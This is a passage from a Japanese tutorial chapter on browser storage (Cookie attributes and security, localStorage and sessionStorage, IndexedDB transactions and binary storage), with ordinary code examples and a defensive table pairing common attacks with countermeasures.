# Webストレージ

> ブラウザに備わる複数のストレージ機構（Cookie、localStorage、sessionStorage、IndexedDB、Cache API）を体系的に理解し、用途・容量・セキュリティ要件に応じた最適な選択を行えるようになる。

## 前提知識

この章を理解するために、以下の知識を事前に習得しておくことを推奨する。

- **ブラウザのセキュリティモデル** ([../00-browser-engine/03-browser-security-model.md](../00-browser-engine/03-browser-security-model.md)): Webストレージは同一オリジンポリシー（Same-Origin Policy）によって保護されている。オリジン（スキーム + ホスト + ポート）の概念、XSS（Cross-Site Scripting）やCSRF（Cross-Site Request Forgery）といった攻撃手法、そしてブラウザがこれらをどのように防御しているかを理解していることが前提となる。
- **Same-Origin Policyの理解**: ストレージのスコープは常にオリジン単位で分離されている。`https://example.com:443`と`https://example.com:8080`は別のオリジンとして扱われ、ストレージも完全に独立している。この分離の仕組みを理解していないと、Cookieのドメイン設定やpostMessage()を使ったクロスオリジン通信での誤解が生じやすい。
- **JSONデータの扱い**: localStorage/sessionStorageは文字列しか保存できないため、オブジェクトや配列を保存する際は`JSON.stringify()`と`JSON.parse()`を使う必要がある。JSONのシリアライズ/デシリアライズの制約（関数やundefinedが失われる、循環参照がエラーになるなど）を理解しておくことで、実装時の落とし穴を避けられる。

これらの基礎知識があることで、ストレージの選択理由やセキュリティ上の制約をより深く理解できる。

---

## この章で学ぶこと

- [ ] 各ストレージ機構の内部動作と容量制限を正確に把握する
- [ ] 用途に応じたストレージの選択基準を設計判断に活かせる
- [ ] IndexedDB のトランザクション・インデックス・バージョン管理を実装できる
- [ ] Cookie のセキュリティ属性（HttpOnly, Secure, SameSite）を正しく設定できる
- [ ] Storage API による容量監視と永続化リクエストを運用に組み込める
- [ ] ストレージまわりの代表的なバグとセキュリティリスクを回避できる

---

## 1. ブラウザストレージの全体像

### 1.1 なぜ複数のストレージが存在するのか

Webの歴史において、クライアント側にデータを保存する需要は段階的に拡大してきた。
最初期は Cookie だけが唯一の永続化手段であったが、容量（4KB）やサーバーへの
自動送信といった制約から、より大容量かつクライアント専用のストレージが求められた。
その結果、Web Storage API（localStorage / sessionStorage）が HTML5 で標準化され、
さらに構造化データを扱える IndexedDB、HTTP レスポンスを丸ごとキャッシュできる
Cache API が追加された。

各ストレージは「排他的な競合」ではなく「補完的な階層」を形成している。

```
┌─────────────────────────────────────────────────────────────────┐
│                    ブラウザストレージ階層図                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐   容量: ~4KB / ドメイン                        │
│  │   Cookie     │   特徴: HTTP リクエストに自動付与              │
│  │  (RFC 6265)  │   用途: 認証トークン、セッション管理            │
│  └──────┬──────┘                                                │
│         │                                                       │
│  ┌──────▼──────┐   容量: 5-10MB / オリジン                      │
│  │ Web Storage │   特徴: 同期API、文字列のみ                     │
│  │ localStorage│   用途: ユーザー設定、テーマ、小規模キャッシュ    │
│  │ sessionStr. │   用途: フォーム一時保存、タブ内状態              │
│  └──────┬──────┘                                                │
│         │                                                       │
│  ┌──────▼──────┐   容量: 数百MB〜GB級                           │
│  │  IndexedDB  │   特徴: 非同期API、構造化データ、インデックス     │
│  │             │   用途: オフラインDB、大量レコード、バイナリ保存   │
│  └──────┬──────┘                                                │
│         │                                                       │
│  ┌──────▼──────┐   容量: 数百MB〜GB級                           │
│  │  Cache API  │   特徴: Request/Response ペア、SW連携           │
│  │             │   用途: オフラインリソース、APIレスポンスキャッシュ │
│  └─────────────┘                                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 ストレージ機構の総合比較表

以下の表は、5つのストレージ機構を主要な観点で比較したものである。

```
┌──────────────────┬──────────┬─────────────┬──────────────┬────────────┬────────────┐
│      観点        │  Cookie  │ localStorage│sessionStorage│ IndexedDB  │ Cache API  │
├──────────────────┼──────────┼─────────────┼──────────────┼────────────┼────────────┤
│ 最大容量(目安)   │ 4KB      │ 5-10MB      │ 5-10MB       │ GB級       │ GB級       │
│ データ形式       │ 文字列   │ 文字列      │ 文字列       │ 構造化     │ Req/Res    │
│ API種別          │ 同期     │ 同期        │ 同期         │ 非同期     │ 非同期     │
│ 有効期間         │ 設定可能 │ 永続        │ タブ閉じまで │ 永続       │ 永続       │
│ サーバー送信     │ 自動     │ なし        │ なし         │ なし       │ なし       │
│ Web Worker利用   │ 不可     │ 不可        │ 不可         │ 可能       │ 可能       │
│ Service Worker   │ 不可     │ 不可        │ 不可         │ 可能       │ 可能       │
│ トランザクション │ なし     │ なし        │ なし         │ あり       │ なし       │
│ インデックス検索 │ 不可     │ 不可        │ 不可         │ 可能       │ URL基準    │
│ 同一オリジン制約 │ ドメイン │ オリジン    │ オリジン     │ オリジン   │ オリジン   │
│ XSS での読取り   │ ※条件付 │ 可能       │ 可能         │ 可能       │ 可能       │
│ CSRF リスク      │ あり     │ なし        │ なし         │ なし       │ なし       │
│ 標準化状態       │ RFC 6265 │ HTML LS     │ HTML LS      │ W3C        │ W3C        │
│ ブラウザ対応     │ 全て     │ 全て        │ 全て         │ 全て       │ 全て       │
└──────────────────┴──────────┴─────────────┴──────────────┴────────────┴────────────┘
※ Cookie は HttpOnly 属性を設定すれば JavaScript からの読取りを防止できる
```

### 1.3 オリジンとストレージの関係

ストレージのスコープは「オリジン」（スキーム + ホスト + ポート）によって決定される。

```
オリジン = scheme://host:port

https://example.com:443    ─── オリジン A
https://example.com:8080   ─── オリジン B（ポートが異なる）
http://example.com:80      ─── オリジン C（スキームが異なる）
https://sub.example.com    ─── オリジン D（ホストが異なる）

各オリジンは独立したストレージ空間を持つ:

  オリジン A の localStorage  ≠  オリジン B の localStorage
  オリジン A の IndexedDB     ≠  オリジン C の IndexedDB

例外: Cookie はドメインベースのスコープを持つため、
      domain=.example.com と設定するとサブドメインでも共有される。
```

---

## 2. Cookie の詳細

### 2.1 Cookie の仕組みと歴史

Cookie は 1994 年に Netscape 社の Lou Montulli が HTTP にステート（状態）を
持たせるために発明した。現在は RFC 6265 で標準化されている。
HTTP 自体はステートレスなプロトコルであるため、リクエストをまたいで
ユーザーを識別するには Cookie が不可欠であった。

Cookie の基本的な流れは以下のとおりである。

```
┌──────────┐                         ┌──────────┐
│ ブラウザ  │                         │ サーバー  │
└────┬─────┘                         └────┬─────┘
     │  1. GET /login                     │
     │ ──────────────────────────────────> │
     │                                    │
     │  2. Set-Cookie: sid=abc123;        │
     │     HttpOnly; Secure; SameSite=Lax │
     │ <────────────────────────────────── │
     │                                    │
     │  3. GET /dashboard                 │
     │     Cookie: sid=abc123             │
     │ ──────────────────────────────────> │
     │                                    │
     │  4. 200 OK (認証済みコンテンツ)     │
     │ <────────────────────────────────── │
     │                                    │
```

### 2.2 Cookie の属性一覧

```javascript
// サーバー側で設定する Cookie の属性
// Set-Cookie: name=value; 属性1; 属性2; ...

// 属性の一覧と説明:

// Expires / Max-Age: 有効期限
// Expires=Thu, 01 Dec 2025 00:00:00 GMT  — 絶対日時
// Max-Age=86400                          — 秒数指定（優先される）
// どちらも未指定 → セッション Cookie（ブラウザ閉じたら削除）

// Domain: 送信先のドメイン範囲
// Domain=.example.com → example.com と全サブドメインに送信
// 未指定 → 設定元のホストのみ（サブドメインに送信されない）

// Path: 送信先のパス範囲
// Path=/ → 全パスに送信
// Path=/api → /api 以下にのみ送信

// Secure: HTTPS 接続でのみ送信
// HttpOnly: JavaScript の document.cookie からアクセス不可
// SameSite: クロスサイトリクエストでの送信制御
//   Strict — 完全に遮断（リンクからの遷移でも送信しない）
//   Lax    — GET のトップレベルナビゲーションのみ許可（デフォルト）
//   None   — 全て許可（Secure 必須）
```

### 2.3 Cookie の操作 — サーバー側とクライアント側

```javascript
// ===== サーバー側（Node.js / Express の例） =====

// Cookie の設定
app.get('/login', (req, res) => {
  const sessionId = generateSecureSessionId();

  res.cookie('sid', sessionId, {
    httpOnly: true,     // XSS 対策: JS からアクセス不可
    secure: true,       // HTTPS のみ
    sameSite: 'lax',    // CSRF 対策
    maxAge: 24 * 60 * 60 * 1000, // 24時間（ミリ秒）
    path: '/',
    domain: '.example.com',
  });

  res.redirect('/dashboard');
});

// Cookie の読み取り（cookie-parser ミドルウェア使用）
app.get('/dashboard', (req, res) => {
  const sessionId = req.cookies.sid;
  if (!sessionId || !isValidSession(sessionId)) {
    return res.redirect('/login');
  }
  res.render('dashboard');
});

// Cookie の削除
app.post('/logout', (req, res) => {
  res.clearCookie('sid', {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    path: '/',
    domain: '.example.com',
  });
  res.redirect('/');
});


// ===== クライアント側 =====

// 読み取り（HttpOnly でないものだけ）
function parseCookies() {
  return document.cookie
    .split('; ')
    .reduce((acc, pair) => {
      const [key, ...valueParts] = pair.split('=');
      acc[key] = decodeURIComponent(valueParts.join('='));
      return acc;
    }, {});
}

const cookies = parseCookies();
console.log(cookies.theme); // 'dark'

// 書き込み
function setCookie(name, value, options = {}) {
  let cookieString = `${encodeURIComponent(name)}=${encodeURIComponent(value)}`;

  if (options.maxAge) cookieString += `; max-age=${options.maxAge}`;
  if (options.path)   cookieString += `; path=${options.path}`;
  if (options.domain) cookieString += `; domain=${options.domain}`;
  if (options.secure) cookieString += '; secure';
  if (options.sameSite) cookieString += `; samesite=${options.sameSite}`;

  document.cookie = cookieString;
}

setCookie('theme', 'dark', { maxAge: 86400 * 30, path: '/' });

// 削除
function deleteCookie(name, path = '/') {
  document.cookie = `${name}=; max-age=0; path=${path}`;
}

deleteCookie('theme');
```

### 2.4 Cookie のセキュリティ上の注意点

Cookie はセキュリティ上もっとも注意が必要なストレージ機構である。

| 攻撃手法 | リスク | 対策 |
|----------|--------|------|
| XSS（クロスサイトスクリプティング） | `document.cookie` でセッションID を窃取 | `HttpOnly` 属性を設定 |
| CSRF（クロスサイトリクエストフォージェリ） | ユーザーの意図しないリクエストを送信 | `SameSite=Lax` または `Strict` |
| 中間者攻撃（MITM） | 通信傍受によるCookie窃取 | `Secure` 属性 + HSTS |
| Cookie Tossing | サブドメインからの Cookie 上書き | `__Host-` プレフィックス |
| セッション固定攻撃 | 攻撃者が指定したセッションIDでログイン | ログイン時にセッションID再生成 |

```javascript
// 推奨: __Host- プレフィックスによる堅牢な Cookie

// __Host- プレフィックスの制約:
// 1. Secure 属性が必須
// 2. Path=/ が必須
// 3. Domain 属性を指定してはいけない
// → サブドメインからの上書きを防止

// Set-Cookie: __Host-sid=abc123; Secure; Path=/; HttpOnly; SameSite=Lax

// __Secure- プレフィックスの制約:
// 1. Secure 属性が必須のみ
// → Domain 指定は可能

// Set-Cookie: __Secure-token=xyz; Secure; Domain=.example.com; Path=/
```

---

## 3. Web Storage API（localStorage / sessionStorage）

### 3.1 仕様と内部動作

Web Storage API は HTML Living Standard で定義される同期的なキーバリューストアである。
localStorage と sessionStorage は同一のインターフェース（`Storage`）を実装しているが、
ライフサイクルとスコープが異なる。

```
┌──────────────────────────────────────────────────────────────┐
│                 Web Storage のスコープ比較                    │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  localStorage:                                               │
│  ┌──────────────────────────────────────┐                    │
│  │       オリジン: https://app.com      │                    │
│  │  ┌────────┐ ┌────────┐ ┌────────┐   │                    │
│  │  │ タブ A │ │ タブ B │ │ タブ C │   │  全タブで共有      │
│  │  └───┬────┘ └───┬────┘ └───┬────┘   │  ブラウザ閉じても  │
│  │      └──────────┴──────────┘        │  データ永続        │
│  │          共有ストレージ空間           │                    │
│  └──────────────────────────────────────┘                    │
│                                                              │
│  sessionStorage:                                             │
│  ┌──────────────────────────────────────┐                    │
│  │       オリジン: https://app.com      │                    │
│  │  ┌────────┐ ┌────────┐ ┌────────┐   │                    │
│  │  │ タブ A │ │ タブ B │ │ タブ C │   │  タブごとに独立    │
│  │  │ [独自] │ │ [独自] │ │ [独自] │   │  タブを閉じると    │
│  │  └────────┘ └────────┘ └────────┘   │  データ消滅        │
│  └──────────────────────────────────────┘                    │
│                                                              │
│  補足: 「タブの複製」「リンクを新しいタブで開く」場合は       │
│        sessionStorage の内容がコピーされる（共有ではない）     │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### 3.2 基本操作

```javascript
// ===== localStorage の基本操作 =====

// 1. 値の保存
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'ja');
localStorage.setItem('fontSize', '16');

// 2. 値の取得
const theme = localStorage.getItem('theme');      // 'dark'
const missing = localStorage.getItem('unknown');   // null

// 3. 値の削除
localStorage.removeItem('fontSize');

// 4. 全データの削除
localStorage.clear();

// 5. キーの列挙
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(`${key}: ${value}`);
}

// 6. プロパティアクセス（非推奨だが動作する）
localStorage.theme = 'light';        // setItem と同等
const t = localStorage.theme;        // getItem と同等
delete localStorage.theme;           // removeItem と同等
// 注意: 'length', 'key', 'getItem' 等の予約名と衝突する可能性がある


// ===== sessionStorage も全く同じ API =====
sessionStorage.setItem('formStep', '2');
const step = sessionStorage.getItem('formStep');
```

### 3.3 オブジェクトの保存と型安全なラッパー

localStorage は文字列しか保存できないため、オブジェクトを扱うには
JSON シリアライズが必要になる。型安全で堅牢なラッパーを実装する。

```typescript
// ===== 型安全な Storage ラッパー =====

interface StorageSchema {
  theme: 'light' | 'dark';
  language: string;
  userPreferences: {
    fontSize: number;
    sidebarOpen: boolean;
    recentPages: string[];
  };
  lastVisit: string; // ISO 8601
}

class TypedStorage<T extends Record<string, unknown>> {
  private storage: Storage;
  private prefix: string;

  constructor(storage: Storage, prefix: string = '') {
    this.storage = storage;
    this.prefix = prefix;
  }

  get<K extends keyof T>(key: K): T[K] | null {
    const raw = this.storage.getItem(this.prefix + String(key));
    if (raw === null) return null;

    try {
      return JSON.parse(raw) as T[K];
    } catch {
      // JSON パースに失敗した場合は文字列をそのまま返す
      return raw as unknown as T[K];
    }
  }

  set<K extends keyof T>(key: K, value: T[K]): void {
    try {
      const serialized = JSON.stringify(value);
      this.storage.setItem(this.prefix + String(key), serialized);
    } catch (e) {
      if (e instanceof DOMException && e.name === 'QuotaExceededError') {
        console.error('Storage quota exceeded. Consider cleaning old data.');
        this.evictOldEntries();
        // リトライ
        const serialized = JSON.stringify(value);
        this.storage.setItem(this.prefix + String(key), serialized);
      } else {
        throw e;
      }
    }
  }

  remove<K extends keyof T>(key: K): void {
    this.storage.removeItem(this.prefix + String(key));
  }

  has<K extends keyof T>(key: K): boolean {
    return this.storage.getItem(this.prefix + String(key)) !== null;
  }

  private evictOldEntries(): void {
    // 容量不足時に古いエントリを削除する簡易的な退去戦略
    const keysToRemove: string[] = [];
    for (let i = 0; i < this.storage.length; i++) {
      const key = this.storage.key(i);
      if (key && key.startsWith(this.prefix)) {
        keysToRemove.push(key);
      }
    }
    // 最初の 1/4 を削除
    const removeCount = Math.ceil(keysToRemove.length / 4);
    for (let i = 0; i < removeCount; i++) {
      this.storage.removeItem(keysToRemove[i]);
    }
  }
}

// 使用例
const appStorage = new TypedStorage<StorageSchema>(localStorage, 'app_');

appStorage.set('theme', 'dark');
appStorage.set('userPreferences', {
  fontSize: 14,
  sidebarOpen: true,
  recentPages: ['/home', '/settings'],
});

const theme = appStorage.get('theme');         // 'light' | 'dark' | null
const prefs = appStorage.get('userPreferences'); // 型推論が効く
```

### 3.4 storage イベントによるタブ間同期

localStorage の変更は、同一オリジンの他のタブに `storage` イベントとして通知される。
これを利用すると、タブ間でのリアルタイム同期が実現できる。

```javascript
// ===== storage イベントの活用 =====

// 注意: storage イベントは「変更を行ったタブ以外」で発火する
// つまり、自分自身のタブでは発火しない

window.addEventListener('storage', (event) => {
  // event.key       — 変更されたキー（clear() の場合は null）
  // event.oldValue  — 変更前の値
  // event.newValue  — 変更後の値（remove の場合は null）
  // event.url       — 変更が行われたページのURL
  // event.storageArea — localStorage or sessionStorage

  if (event.key === 'theme') {
    applyTheme(event.newValue);
  }

  if (event.key === 'auth_logout') {
    // 他のタブでログアウトされたら自分もログアウト
    window.location.href = '/login';
  }

  if (event.key === null) {
    // clear() が呼ばれた
    console.log('Storage was cleared in another tab');
  }
});


// ===== BroadcastChannel との比較 =====

// storage イベントの制約:
// - localStorage の変更を介さないと通信できない
// - 一時的なメッセージのやり取りには不向き

// BroadcastChannel: タブ間メッセージングの専用API
const channel = new BroadcastChannel('app_sync');

// 送信（全タブに届く）
channel.postMessage({ type: 'THEME_CHANGED', theme: 'dark' });

// 受信
channel.onmessage = (event) => {
  if (event.data.type === 'THEME_CHANGED') {
    applyTheme(event.data.theme);
  }
};

// 不要になったら閉じる
channel.close();
```

### 3.5 容量制限と QuotaExceededError

```javascript
// ===== 容量制限のテストと対処 =====

// localStorage の容量を確認する関数
function getStorageUsage(storage = localStorage) {
  let total = 0;
  for (let i = 0; i < storage.length; i++) {
    const key = storage.key(i);
    if (key) {
      // UTF-16 エンコーディングのため、1文字 = 2バイト
      total += (key.length + storage.getItem(key).length) * 2;
    }
  }
  return {
    bytes: total,
    kb: (total / 1024).toFixed(2),
    mb: (total / 1024 / 1024).toFixed(4),
  };
}

console.log(getStorageUsage());
// { bytes: 2048, kb: '2.00', mb: '0.0020' }


// QuotaExceededError のハンドリング
function safeSetItem(key, value) {
  try {
    localStorage.setItem(key, value);
    return true;
  } catch (e) {
    if (e instanceof DOMException) {
      switch (e.name) {
        case 'QuotaExceededError':
          console.warn('localStorage is full. Attempting cleanup...');
          // 古いキャッシュを削除してリトライ
          cleanupExpiredCache();
          try {
            localStorage.setItem(key, value);
            return true;
          } catch {
            console.error('Still full after cleanup. Data not saved.');
            return false;
          }
        case 'SecurityError':
          // プライベートブラウジングやiframeの制約
          console.error('Storage access denied.');
          return false;
        default:
          throw e;
      }
    }
    throw e;
  }
}

function cleanupExpiredCache() {
  const now = Date.now();
  const keysToDelete = [];

  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (key && key.startsWith('cache_')) {
      try {
        const item = JSON.parse(localStorage.getItem(key));
        if (item.expiresAt && item.expiresAt < now) {
          keysToDelete.push(key);
        }
      } catch {
        keysToDelete.push(key); // パースできないものも削除対象
      }
    }
  }

  keysToDelete.forEach(key => localStorage.removeItem(key));
  console.log(`Cleaned up ${keysToDelete.length} expired cache entries.`);
}
```

---

## 4. IndexedDB の詳細

### 4.1 IndexedDB の設計思想

IndexedDB はブラウザ上で大量の構造化データを扱うための低レベル API である。
リレーショナルデータベースとは異なり、オブジェクト指向のデータモデルを採用しており、
キーパスによるプライマリキーとインデックスによる検索をサポートする。

主な特徴は以下のとおりである。

1. **非同期 API**: メインスレッドをブロックしない
2. **トランザクション**: ACID特性の一部を保証（Atomicity と Isolation）
3. **構造化クローン**: オブジェクト、配列、Date、Blob、ArrayBuffer 等を直接保存可能
4. **インデックス**: 任意のプロパティに対する効率的な検索
5. **バージョン管理**: スキーマのマイグレーション機構を内蔵
6. **大容量**: ブラウザの空きディスク容量に依存（通常 GB 級）

```
┌────────────────────────────────────────────────────────────┐
│                IndexedDB の構造                             │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  Database: "myApp" (version: 3)                            │
│  ├── ObjectStore: "users"                                  │
│  │   ├── keyPath: "id"                                     │
│  │   ├── Index: "email" (unique: true)                     │
│  │   ├── Index: "age"                                      │
│  │   ├── Record: { id: 1, name: "Taro", email: "...", }   │
│  │   ├── Record: { id: 2, name: "Hana", email: "...", }   │
│  │   └── Record: { id: 3, name: "Ken",  email: "...", }   │
│  │                                                         │
│  ├── ObjectStore: "products"                               │
│  │   ├── keyPath: "sku"                                    │
│  │   ├── Index: "category"                                 │
│  │   ├── Index: "price"                                    │
│  │   └── Records: ...                                      │
│  │                                                         │
│  └── ObjectStore: "orders"                                 │
│      ├── autoIncrement: true                               │
│      ├── Index: "userId"                                   │
│      ├── Index: "date"                                     │
│      └── Records: ...                                      │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

### 4.2 ネイティブ API による基本操作

```javascript
// ===== IndexedDB ネイティブ API の完全例 =====

// --- データベースのオープンとスキーマ定義 ---

function openDatabase() {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open('TaskManager', 2);

    // バージョンが上がった時（またはDB新規作成時）に呼ばれる
    request.onupgradeneeded = (event) => {
      const db = event.target.result;
      const oldVersion = event.oldVersion;

      // バージョン 0 → 1: 初期スキーマ
      if (oldVersion < 1) {
        const taskStore = db.createObjectStore('tasks', {
          keyPath: 'id',
          autoIncrement: true,
        });
        taskStore.createIndex('status', 'status', { unique: false });
        taskStore.createIndex('dueDate', 'dueDate', { unique: false });
        taskStore.createIndex('priority', 'priority', { unique: false });
      }

      // バージョン 1 → 2: カテゴリ追加
      if (oldVersion < 2) {
        // 既存の ObjectStore にインデックスを追加
        const taskStore = event.target.transaction.objectStore('tasks');
        taskStore.createIndex('category', 'category', { unique: false });

        // 新しい ObjectStore を追加
        db.createObjectStore('categories', { keyPath: 'name' });
      }
    };

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);

    // データベースの削除やバージョンアップが他タブで行われた場合
    request.onblocked = () => {
      console.warn('Database upgrade blocked. Close other tabs.');
    };
  });
}


// --- CRUD 操作 ---

async function addTask(task) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readwrite');
    const store = tx.objectStore('tasks');
    const request = store.add(task);

    request.onsuccess = () => resolve(request.result); // 生成された ID
    request.onerror = () => reject(request.error);

    tx.oncomplete = () => db.close();
  });
}

async function getTask(id) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readonly');
    const store = tx.objectStore('tasks');
    const request = store.get(id);

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);

    tx.oncomplete = () => db.close();
  });
}

async function updateTask(task) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readwrite');
    const store = tx.objectStore('tasks');
    const request = store.put(task); // put = upsert

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);

    tx.oncomplete = () => db.close();
  });
}

async function deleteTask(id) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readwrite');
    const store = tx.objectStore('tasks');
    const request = store.delete(id);

    request.onsuccess = () => resolve();
    request.onerror = () => reject(request.error);

    tx.oncomplete = () => db.close();
  });
}


// --- インデックスを使った検索 ---

async function getTasksByStatus(status) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readonly');
    const store = tx.objectStore('tasks');
    const index = store.index('status');
    const request = index.getAll(status);

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);

    tx.oncomplete = () => db.close();
  });
}

// 範囲検索（IDBKeyRange）
async function getTasksDueBefore(date) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readonly');
    const store = tx.objectStore('tasks');
    const index = store.index('dueDate');

    // upperBound: 指定値以下、true で指定値を含まない
    const range = IDBKeyRange.upperBound(date.toISOString(), false);
    const request = index.getAll(range);

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);

    tx.oncomplete = () => db.close();
  });
}


// --- カーソルによる逐次処理 ---

async function processAllTasks(callback) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readonly');
    const store = tx.objectStore('tasks');
    const request = store.openCursor();
    const results = [];

    request.onsuccess = (event) => {
      const cursor = event.target.result;
      if (cursor) {
        results.push(callback(cursor.value));
        cursor.continue(); // 次のレコードへ
      } else {
        resolve(results); // 全レコード処理完了
      }
    };

    request.onerror = () => reject(request.error);
    tx.oncomplete = () => db.close();
  });
}

// 使用例
const taskIds = await addTask({
  title: 'レポート作成',
  status: 'pending',
  priority: 'high',
  category: 'work',
  dueDate: '2025-12-31',
});
console.log('Created task with ID:', taskIds);

const pendingTasks = await getTasksByStatus('pending');
console.log('Pending tasks:', pendingTasks);
```

### 4.3 idb ライブラリによる簡潔な操作

ネイティブの IndexedDB API はコールバックベースで冗長になりがちである。
Jake Archibald が開発した `idb` ライブラリは、Promise ベースの薄いラッパーを
提供し、コードの可読性を大幅に向上させる。

```javascript
// ===== idb ライブラリの使用例 =====

import { openDB, deleteDB } from 'idb';

// --- データベースのオープン ---
const db = await openDB('TaskManager', 2, {
  upgrade(db, oldVersion, newVersion, transaction) {
    if (oldVersion < 1) {
      const taskStore = db.createObjectStore('tasks', {
        keyPath: 'id',
        autoIncrement: true,
      });
      taskStore.createIndex('status', 'status');
      taskStore.createIndex('dueDate', 'dueDate');
      taskStore.createIndex('priority', 'priority');
    }
    if (oldVersion < 2) {
      const taskStore = transaction.objectStore('tasks');
      taskStore.createIndex('category', 'category');
      db.createObjectStore('categories', { keyPath: 'name' });
    }
  },
  blocked() {
    console.warn('Database upgrade blocked by another tab.');
  },
  blocking() {
    // 自分が古いバージョンを使っている場合
    db.close();
    console.warn('Database outdated. Please reload.');
  },
  terminated() {
    console.error('Database connection was unexpectedly terminated.');
  },
});

// --- CRUD（驚くほどシンプル）---

// Create
const id = await db.add('tasks', {
  title: '設計書レビュー',
  status: 'pending',
  priority: 'high',
  category: 'work',
  dueDate: '2025-06-30',
  createdAt: new Date().toISOString(),
});

// Read
const task = await db.get('tasks', id);
const allTasks = await db.getAll('tasks');

// Update
task.status = 'in-progress';
await db.put('tasks', task);

// Delete
await db.delete('tasks', id);

// --- インデックスによる検索 ---
const pendingTasks2 = await db.getAllFromIndex('tasks', 'status', 'pending');
const highPriority = await db.getAllFromIndex('tasks', 'priority', 'high');

// 範囲検索
const dueSoon = await db.getAllFromIndex(
  'tasks',
  'dueDate',
  IDBKeyRange.upperBound('2025-07-01')
);

// --- トランザクション ---
const tx = db.transaction(['tasks', 'categories'], 'readwrite');
const taskStore = tx.objectStore('tasks');
const catStore = tx.objectStore('categories');

await Promise.all([
  taskStore.add({ title: 'New Task', status: 'pending', category: 'dev' }),
  catStore.put({ name: 'dev', color: '#3b82f6' }),
  tx.done,
]);

// --- データベースの削除 ---
await deleteDB('TaskManager');
```

### 4.4 IndexedDB のトランザクション詳細

IndexedDB のトランザクションは以下の特性を持つ。

```
┌─────────────────────────────────────────────────────────────┐
│            IndexedDB トランザクションの特性                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  モード:                                                    │
│  ┌──────────────┬───────────────────────────────────────┐   │
│  │ readonly     │ 読み取りのみ。複数同時実行可能        │   │
│  │ readwrite    │ 読み書き可能。同じ ObjectStore への    │   │
│  │              │ 同時 readwrite は直列化される          │   │
│  │ versionchange│ スキーマ変更専用。onupgradeneeded 内   │   │
│  └──────────────┴───────────────────────────────────────┘   │
│                                                             │
│  ライフサイクル:                                             │
│  ┌─────────┐    ┌─────────┐    ┌──────────┐               │
│  │ active  │───>│ committing│───>│ finished │              │
│  └────┬────┘    └─────────┘    └──────────┘               │
│       │                                                     │
│       │ (エラー発生)                                        │
│       ▼                                                     │
│  ┌─────────┐                                               │
│  │ aborted │  全操作がロールバックされる                     │
│  └─────────┘                                               │
│                                                             │
│  重要な制約:                                                │
│  - トランザクション内で await を使って非同期処理を           │
│    挟むと、トランザクションが自動コミットされてしまう        │
│  - fetch(), setTimeout() などの非同期処理は                 │
│    トランザクション外で行うこと                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

```javascript
// ===== トランザクションの注意点 =====

// 正しい例: 全操作を同一マイクロタスク内で実行
async function transferTask(taskId, fromCategory, toCategory) {
  const db = await openDB('TaskManager', 2);
  const tx = db.transaction(['tasks', 'categories'], 'readwrite');

  const task = await tx.objectStore('tasks').get(taskId);
  task.category = toCategory;

  // 全ての操作を tx.done の前に投入する
  await Promise.all([
    tx.objectStore('tasks').put(task),
    tx.objectStore('categories').put({ name: toCategory, count: 1 }),
    tx.done,
  ]);
}


// 誤った例: トランザクション中に外部非同期処理を挟む
async function badExample(taskId) {
  const db = await openDB('TaskManager', 2);
  const tx = db.transaction('tasks', 'readwrite');

  const task = await tx.objectStore('tasks').get(taskId);

  // NG: fetch を挟むとトランザクションが自動コミットされる
  const response = await fetch(`/api/tasks/${taskId}/details`);
  const details = await response.json();

  // この時点でトランザクションは既に完了しているためエラーになる
  task.details = details;
  await tx.objectStore('tasks').put(task); // TransactionInactiveError!
}
```

### 4.5 IndexedDB でのバイナリデータ保存

IndexedDB は構造化クローンアルゴリズムを使用するため、
Blob や ArrayBuffer を直接保存できる。

```javascript
// ===== バイナリデータの保存と取得 =====

// 画像ファイルの保存
async function saveImage(imageFile) {
  const db = await openDB('MediaDB', 1, {
    upgrade(db) {
      db.createObjectStore('images', { keyPath: 'id' });
    },
  });

  await db.put('images', {
    id: `img_${Date.now()}`,
    name: imageFile.name,
    type: imageFile.type,
    size: imageFile.size,
    blob: imageFile,  // File/Blob をそのまま保存
    savedAt: new Date().toISOString(),
  });
}

// 画像の取得と表示
async function loadImage(imageId) {
  const db = await openDB('MediaDB', 1);
  const record = await db.get('images', imageId);

  if (record) {
    const url = URL.createObjectURL(record.blob);
    const img = document.createElement('img');
    img.src = url;
    img.onload = () => URL.revokeObjectURL(url); // メモリリーク防止
    document.body.appendChild(img);
  }
}


// ArrayBuffer の保存（音声データなど）
async function saveAudioBuffer(audioBuffer) {
  const db = await openDB('MediaDB', 1);

  // AudioBuffer を Float32Array に変換
  const channelData = [];
  for (let i = 0; i < audioBuffer.numberOfChannels; i++) {
    channelData.push(audioBuffer.getChannelData(i));
  }

  await db.put('images', {
    id: `audio_${Date.now()}`,
    type: 'audio',
    sampleRate: audioBuffer.sampleRate,
    numberOfChannels: audioBuffer.numberOfChannels,
    length: audioBuffer.length,
    channels: channelData,  // Float32Array を直接保存
  });
}
```

---

## 5. Cache API の概要

### 5.1 Cache API の位置づけ

